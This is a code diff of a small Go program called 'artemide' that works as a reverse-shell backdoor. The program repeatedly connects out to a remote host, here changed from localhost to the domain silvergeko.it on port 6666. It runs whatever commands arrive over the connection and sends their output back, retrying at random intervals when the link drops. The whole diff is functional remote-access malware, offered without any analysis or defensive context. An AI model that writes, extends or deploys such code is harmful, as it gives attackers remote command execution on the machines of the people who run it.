@@ -3,48 +3,52 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"log"
 	"math/rand"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 	"time"
+
+	"github.com/bogdanovich/dns_resolver"
 )
 
 const (
-	CONN_HOST = "127.0.0.1:6666"
-	CONN_TYPE = "tcp"
-	NAME      = "artemide"
+	HOSTPORT = "6666"
+	HOSTNAME = "silvergeko.it"
+	CONNTYPE = "tcp"
+	NAME     = "artemide"
 )
 
 func main() {
 	for {
-		r_time := time.Duration(random(1, 100))
-		conn, err := net.Dial(CONN_TYPE, CONN_HOST)
+		rtime := time.Duration(random(1, 100))
+		conn, err := net.Dial(CONNTYPE, getIP(HOSTNAME)+":"+HOSTPORT)
 		if err != nil {
-			time.Sleep(r_time * time.Second)
+			time.Sleep(rtime * time.Second)
 			continue
 		} else {
-			conn.Write(to_byte(NAME))
+			conn.Write(toByte(NAME))
 			fmt.Println("Connected...")
 			for {
 				message, err := bufio.NewReader(conn).ReadString('\n')
 				if err != nil {
-					time.Sleep(r_time * time.Second)
+					time.Sleep(rtime * time.Second)
 					break
 				}
 				if strings.Compare(string(message), "quit\n") == 0 {
 					os.Exit(0)
 				}
-				out, err := exec_cmd(message)
+				out, err := execCmd(message)
 				fmt.Println(len(out))
 				if err != nil {
 					fmt.Println("Errore")
-					err_text := fmt.Sprintf("%s", err)
-					conn.Write(to_byte(err_text))
+					errText := fmt.Sprintf("%s", err)
+					conn.Write(toByte(errText))
 				}
 				if len(out) == 0 {
-					conn.Write(to_byte("Eseguito"))
+					conn.Write(toByte("Eseguito"))
 				} else {
 					conn.Write(out)
 				}
@@ -61,7 +65,18 @@ func random(min, max int) int {
 	return rand.Intn(max-min) + min
 }
 
-func exec_cmd(command string) ([]byte, error) {
+func getIP(hostname string) string {
+	resolver := dns_resolver.New([]string{"8.8.8.8", "8.8.4.4"})
+	resolver.RetryTimes = 5
+
+	ip, err := resolver.LookupHost(hostname)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+	return ip[0].String()
+}
+
+func execCmd(command string) ([]byte, error) {
 	parts := strings.Fields(command)
 	head := parts[0]
 	parts = parts[1:len(parts)]
@@ -69,6 +84,6 @@ func exec_cmd(command string) ([]byte, error) {
 	return out, err
 }
 
-func to_byte(f string, args ...interface{}) []byte {
+func toByte(f string, args ...interface{}) []byte {
 	return []byte(fmt.Sprintf(f, args...))
 }
